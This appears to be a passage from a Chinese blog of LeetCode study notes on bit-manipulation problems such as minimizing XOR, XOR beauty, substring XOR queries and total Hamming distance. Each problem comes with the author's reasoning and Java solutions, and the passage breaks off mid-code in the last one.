<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minimizeXor</span><span class="params">(<span class="type">int</span> num1, <span class="type">int</span> num2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> Integer.bitCount(num1);</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> Integer.bitCount(num2);</span><br><span class="line">        <span class="keyword">if</span>(a &gt;= b)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tempNum1</span> <span class="operator">=</span> num1;</span><br><span class="line">            <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> a - b;</span><br><span class="line">            <span class="keyword">while</span> (c &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                tempNum1 &amp;= (tempNum1 - <span class="number">1</span>);</span><br><span class="line">                c--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> tempNum1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> num1;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> b - a;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (c &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span> ((num1 &amp; start) != <span class="number">0</span>)&#123;</span><br><span class="line">                start &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res += start;</span><br><span class="line">            start &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            c--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更加简洁的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int minimizeXor(int num1, int num2) &#123;</span><br><span class="line">        var c1 = Integer.bitCount(num1);</span><br><span class="line">        var c2 = Integer.bitCount(num2);</span><br><span class="line">        for (; c2 &lt; c1; ++c2) num1 &amp;= num1 - 1; // 最低的 1 变成 0</span><br><span class="line">        for (; c2 &gt; c1; --c2) num1 |= num1 + 1; // 最低的 0 变成 1</span><br><span class="line">        return num1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>技巧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将最低位1变成0:num1 &amp;= num1 - 1;</span><br><span class="line">最低的0 变成1 : num1 |= num1 + 1;</span><br></pre></td></tr></table></figure>

<h3 id="2527-查询数组异或美丽值"><a href="#2527-查询数组异或美丽值" class="headerlink" title="2527. 查询数组异或美丽值"></a><a href="https://leetcode.cn/problems/find-xor-beauty-of-array/">2527. 查询数组异或美丽值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">((nums[i] | nums[j]) &amp; nums[k])</span><br><span class="line">nums.length &lt;= 10^5</span><br><span class="line">遍历求需要10^15，肯定不行。</span><br><span class="line">看看性质了</span><br><span class="line"></span><br><span class="line">https://leetcode.cn/problems/find-xor-beauty-of-array/solutions/2050235/chai-wei-hua-jian-cheng-yi-ge-piao-liang-pun6/</span><br><span class="line">位运算经典技巧：由于每个比特位互不相干，所以拆分成每个比特位分别计算。</span><br><span class="line">(x|y)&amp;c 为1的话。需要c为1，x、y不能同时为0</span><br><span class="line">设有y个1.</span><br><span class="line">那么有(x|y)为1的个数为n*n - (n-y)*(n-y)=(2ny-y*y)</span><br><span class="line">共有(2ny-y*y)y，异或偶数个1为0.化简为y^3次方，跟y的奇偶性相关</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">xorBeauty</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            res ^= num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2317-操作后的最大异或和"><a href="#2317-操作后的最大异或和" class="headerlink" title="2317. 操作后的最大异或和"></a><a href="https://leetcode.cn/problems/maximum-xor-after-operations/">2317. 操作后的最大异或和</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md，没仔细看。以为只能操作一次，结果能任意次操作。那不简单死，直接或就行了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumXOR</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">orSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            orSum |= num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> orSum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2564-子字符串异或查询"><a href="#2564-子字符串异或查询" class="headerlink" title="2564. 子字符串异或查询"></a><a href="https://leetcode.cn/problems/substring-xor-queries/">2564. 子字符串异或查询</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也就是找到val = first^second</span><br><span class="line">因为query次数比较多，因此需要先预处理数据。直观的感觉用n^2的方法来处理数据（之后看看题解有没有优化，之后直接从map获取结果）</span><br><span class="line">观察数据发现有2^29 &lt; 10^9 &lt; 2^30。预处理数据如果超过了直接continue</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] substringXorQueries(String s, <span class="type">int</span>[][] queries) &#123;</span><br><span class="line">        Map&lt;Integer, Integer[]&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_VAL</span> <span class="operator">=</span> Integer.MAX_VALUE / <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s.charAt(i) == <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                    map.put(<span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">Integer</span>[]&#123;i,i&#125;);</span><br><span class="line">                    flag = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i; j &lt; n; j++) &#123;</span><br><span class="line">                val = val * <span class="number">2</span> + s.charAt(j) - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span> (val &gt; MAX_VAL) <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> (map.containsKey(val)) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> map.get(val)[<span class="number">0</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> map.get(val)[<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">if</span> (end - start &gt; j - i) &#123;</span><br><span class="line">                        map.put(val, <span class="keyword">new</span> <span class="title class_">Integer</span>[]&#123;i, j&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    map.put(val, <span class="keyword">new</span> <span class="title class_">Integer</span>[]&#123;i, j&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> queries.length;</span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[length][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(queries[i][<span class="number">0</span>] ^ queries[i][<span class="number">1</span>]))&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> map.get(queries[i][<span class="number">0</span>] ^ queries[i][<span class="number">1</span>])[<span class="number">0</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> map.get(queries[i][<span class="number">0</span>] ^ queries[i][<span class="number">1</span>])[<span class="number">1</span>];</span><br><span class="line">                res[i][<span class="number">0</span>] = start;</span><br><span class="line">                res[i][<span class="number">1</span>] = end;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                res[i] = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>,-<span class="number">1</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题解代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    private static final int[] NOT_FOUND = new int[]&#123;-1, -1&#125;;</span><br><span class="line"></span><br><span class="line">    public int[][] substringXorQueries(String S, int[][] queries) &#123;</span><br><span class="line">        var m = new HashMap&lt;Integer, int[]&gt;();</span><br><span class="line">        int i = S.indexOf(&#x27;0&#x27;);</span><br><span class="line">        if (i &gt;= 0) m.put(0, new int[]&#123;i, i&#125;); // 这样下面就可以直接跳过 &#x27;0&#x27; 了，效率更高</span><br><span class="line">        var s = S.toCharArray();</span><br><span class="line">        for (int l = 0, n = s.length; l &lt; n; ++l) &#123;</span><br><span class="line">            if (s[l] == &#x27;0&#x27;) continue;</span><br><span class="line">            for (int r = l, x = 0; r &lt; Math.min(l + 30, n); ++r) &#123;</span><br><span class="line">                x = x &lt;&lt; 1 | (s[r] &amp; 1);</span><br><span class="line">                m.putIfAbsent(x, new int[]&#123;l, r&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var ans = new int[queries.length][];</span><br><span class="line">        for (i = 0; i &lt; queries.length; i++)</span><br><span class="line">            ans[i] = m.getOrDefault(queries[i][0] ^ queries[i][1], NOT_FOUND);</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题解更加简洁并且一些固定值直接用final写好了。而且很好运用位运算x = x &lt;&lt; 1 | (s[r] &amp; 1)</span><br></pre></td></tr></table></figure>

<h2 id="拆位-x2F-贡献法"><a href="#拆位-x2F-贡献法" class="headerlink" title="拆位 &#x2F; 贡献法"></a>拆位 &#x2F; 贡献法</h2><h3 id="477-汉明距离总和"><a href="#477-汉明距离总和" class="headerlink" title="477. 汉明距离总和"></a><a href="https://leetcode.cn/problems/total-hamming-distance/">477. 汉明距离总和</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对应某位设有</span><br><span class="line">x个数对应为1，y个数对应为0.那么对应距离为x*y。</span><br><span class="line">因此模拟即可，然后计算</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">totalHammingDistance</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">MAX_VAL</span> <span class="operator">=</span> (<span class="type">int</span>) <span class="number">1e9</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= MAX_VAL; i &lt;&lt;= <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">oneCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">                <span class="keyword">if</span>((num &amp; i) != <span class="number">0</span>) oneCount++;</span><br><span class="line">            &#125;</span><br><span class="line">            res += oneCount * (n - oneCount);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1863-找出所有子集的异或总和再求和"><a href="#1863-找出所有子集的异或总和再求和" class="headerlink" title="1863. 找出所有子集的异或总和再求和"></a><a href="https://leetcode.cn/problems/sum-of-all-subset-xor-totals/">1863. 找出所有子集的异或总和再求和</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一：暴力法，直接dfs即可（数字长度很短2^12）</span><br><span class="line">二：不同位之间不会互相影响。假设某位有x个1，y个0。</span><br><span class="line">想要异或结果为1得话，有 (c(n,1)+.....c(n,2k+1)) * 2^(y) = 2^(n-1)</span><br><span class="line">方法二：迭代法枚举子集</span><br><span class="line">方法三：按位考虑 + 二项式展开</span><br></pre></td></tr></table></figure>

<p><a href="https://leetcode.cn/problems/sum-of-all-subset-xor-totals/solutions/784306/sum-of-all-subset-xor-totals-by-leetcode-o5aa/">1863. 找出所有子集的异或总和再求和 - 题解</a></p>
<p>代码一</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">subsetXORSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        dfs(nums, <span class="number">0</span>, <span class="number">0</span>, n);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> perXorSum, <span class="type">int</span> i, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == n) &#123;</span><br><span class="line">            res += perXorSum;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(nums, perXorSum, i + <span class="number">1</span>, n);</span><br><span class="line">        dfs(nums, perXorSum ^ nums[i], i + <span class="number">1</span>, n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码三</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">subsetXORSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">orSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            orSum |= num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> orSum &lt;&lt; (n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2425-所有数对的异或和"><a href="#2425-所有数对的异或和" class="headerlink" title="2425. 所有数对的异或和"></a><a href="https://leetcode.cn/problems/bitwise-xor-of-all-pairings/">2425. 所有数对的异或和</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">只考虑某一位，设num1对应该位为1有x1个，对应为0有y1个。nums2同理</span><br><span class="line">异或出来为一的情况有x1*y2+y1*x2。之后会继续异或为奇数就为1，偶数就为0</span><br><span class="line">一个朴素思想是用一个31的数组来存1的个数，然后计算即可。（先这样写，看看题解还能优化不）</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">xorAllNums</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num1Length</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num2Length</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">        <span class="type">int</span>[] count1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">30</span>];</span><br><span class="line">        <span class="type">int</span>[] count2 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">30</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">bitCount</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bitCount; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> num : nums1) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((num &amp; (<span class="number">1</span> &lt;&lt; i)) != <span class="number">0</span>) count1[i]++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> num : nums2) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((num &amp; (<span class="number">1</span> &lt;&lt; i)) != <span class="number">0</span>) count2[i]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bitCount; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">oneCount</span> <span class="operator">=</span> count1[i] * (num2Length - count2[i]) + (num1Length - count1[i]) * count2[i];</span><br><span class="line">            <span class="keyword">if</span> ((oneCount &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                res += (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其它思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://leetcode.cn/problems/bitwise-xor-of-all-pairings/solutions/1863486/tao-lun-mei-ge-yuan-su-zai-da-an-zhong-d-uutg/</span><br><span class="line">草，想复杂了</span><br></pre></td></tr></table></figure>

<h3 id="2275-按位与结果大于零的最长组合"><a href="#2275-按位与结果大于零的最长组合" class="headerlink" title="2275. 按位与结果大于零的最长组合"></a><a href="https://leetcode.cn/problems/largest-combination-with-bitwise-and-greater-than-zero/">2275. 按位与结果大于零的最长组合</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果是子数组的话，可以logtrick</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public int largestCombination(int[] candidates) &#123;</span><br><span class="line">    int n = candidates.length;</span><br><span class="line">    int res = 1;</span><br><span class="line">    for (int i = 0; i &lt; n; i++) &#123;</span><br><span class="line">        for (int j = i - 1; j &gt;= 0 &amp;&amp; (candidates[j] &amp; candidates[i]) != candidates[j]; j--) &#123;</span><br><span class="line">            candidates[j] &amp;= candidates[i];</span><br><span class="line">        &#125;</span><br><span class="line">        res = Integer.max(res, i - lower_bound(candidates, 0, i) + 1);</span><br><span class="line">    &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int lower_bound(int[] candidates, int left, int right) &#123;</span><br><span class="line">    //递增数组,</span><br><span class="line">    while (left &lt; right) &#123;</span><br><span class="line">        int mid = (left + right) / 2;</span><br><span class="line">        if (candidates[mid] &gt;= 1) &#123;</span><br><span class="line">            right = mid;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            left = mid + 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return left;//一定有值大于0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本题不是子数组，是子序列。对于与来说一个0会导致对应位一直为0。一个贪心的想法是看哪一位的1最多，盯着某一位看即可。可以证明正确性，因为这样选择的长度一定最大并且满足条件。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">largestCombination</span><span class="params">(<span class="type">int</span>[] candidates)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">bitCount</span> <span class="operator">=</span> <span class="number">24</span>;</span><br><span class="line">        <span class="type">int</span>[] record = <span class="keyword">new</span> <span class="title class_">int</span>[bitCount];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bitCount; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> candidate : candidates) &#123;</span><br><span class="line">                <span class="keyword">if</span>((candidate &amp; (<span class="number">1</span>&lt;&lt;i)) != <span class="number">0</span>) record[i]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Arrays.stream(record).max().getAsInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1835-所有数对按位与结果的异或和"><a href="#1835-所有数对按位与结果的异或和" class="headerlink" title="1835. 所有数对按位与结果的异或和"></a><a href="https://leetcode.cn/problems/find-xor-sum-of-all-pairs-bitwise-and/">1835. 所有数对按位与结果的异或和</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以使用2425的朴素写法。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">但还是看看有没有什么结论，想不出来了先原始写法。后面补高级写法</span><br><span class="line">高级写法来了：(a&amp;b)^(a&amp;c) == a&amp;(b^c)  之间两个数组分别异或然后和即可</span><br></pre></td></tr></table></figure>

<p>朴素写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getXORSum</span><span class="params">(<span class="type">int</span>[] arr1, <span class="type">int</span>[] arr2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">arr1Length</span> <span class="operator">=</span> arr1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">arr2Length</span> <span class="operator">=</span> arr2.length;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BIT_COUNT</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line">        <span class="type">int</span>[] record1 = <span class="keyword">new</span> <span class="title class_">int</span>[BIT_COUNT];</span><br><span class="line">        <span class="type">int</span>[] record2 = <span class="keyword">new</span> <span class="title class_">int</span>[BIT_COUNT];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; BIT_COUNT; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> num : arr1) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((num &amp; (<span class="number">1</span> &lt;&lt; i)) != <span class="number">0</span>) record1[i]++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> num : arr2) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((num &amp; (<span class="number">1</span> &lt;&lt; i)) != <span class="number">0</span>) record2[i]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; BIT_COUNT; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mulCount</span> <span class="operator">=</span> record1[i] * record2[i];</span><br><span class="line">            <span class="keyword">if</span> ((mulCount &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                res += (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3153-所有数对中数位差之和"><a href="#3153-所有数对中数位差之和" class="headerlink" title="3153. 所有数对中数位差之和"></a><a href="https://leetcode.cn/problems/sum-of-digit-differences-of-all-pairs/">3153. 所有数对中数位差之和</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数位长度相同。先获取长度，然后创建 arr[n][10]最后计算总和</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">sumDigitDifferences</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">numLength</span> <span class="operator">=</span> getNumLength(nums[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BIT</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span>[][] record = <span class="keyword">new</span> <span class="title class_">int</span>[numLength][BIT];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (num &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                record[count][num % <span class="number">10</span>]++;</span><br><span class="line">                count++;</span><br><span class="line">                num /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; numLength; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; BIT; j++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> j + <span class="number">1</span>; k &lt; BIT; k++) &#123;</span><br><span class="line">                    res += (<span class="type">long</span>) record[i][k] * record[i][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getNumLength</span><span class="params">(<span class="type">int</span> num)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (num &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            num /= <span class="number">10</span>;</span><br><span class="line">            res++;</span><br><span class="line">        